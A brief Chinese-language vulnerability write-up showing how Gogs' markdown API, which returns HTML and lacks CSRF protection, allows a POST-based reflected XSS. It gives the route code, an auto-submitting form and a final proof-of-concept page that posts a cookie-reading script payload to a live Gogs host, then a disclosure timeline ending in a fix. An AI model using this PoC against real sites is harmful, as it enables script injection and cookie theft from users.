### 通过form利用gogs的post型反射型xss

### 审计

在审计gogs代码时发现gogs的api允许渲染markdown.最初以为是无法利用的,但发现gogs这个api返回的content-type是html,并且没有csrf机制.

```go
m.Group("/v1", func() {
	// Handle preflight OPTIONS request
	m.Options("/*", func() {})

	// Miscellaneous
	m.Post("/markdown", bind(api.MarkdownOption{}), misc2.Markdown)
	m.Post("/markdown/raw", misc2.MarkdownRaw)
```

但这个api仅仅允许post方法,不能通过常见的get方法来进行xss.



### 构造poc

无法直接通过url 提交一个post请求,但可以通过form元素进行提交并直接重定向. 

最简单的提交例子

```html
<form name=Form action=url method=post>
 <input type=hidden name=xxx value=xxx>
</form>
<script>
 document.Form.submit();
</script>
```

这和csrf都是通过伪造请求来利用 只是csrf是通过xhr请求 这是通过form来得到需要的重定向.



最后的poc

```html
 <html> 

<body onload="document.forms[0].submit()"> 

<form method="post"
   action="http://try.gogs.io/api/v1/markdown"> 

   

<input type="hidden" name="text"
   value="<script>alert(document.cookie)</script>"> 

</form> 

</html> 
```



漏洞时间线

```
1.25 发送提交漏洞邮件
1.25 一小时后得到第一次回应
1.27 漏洞修复
```

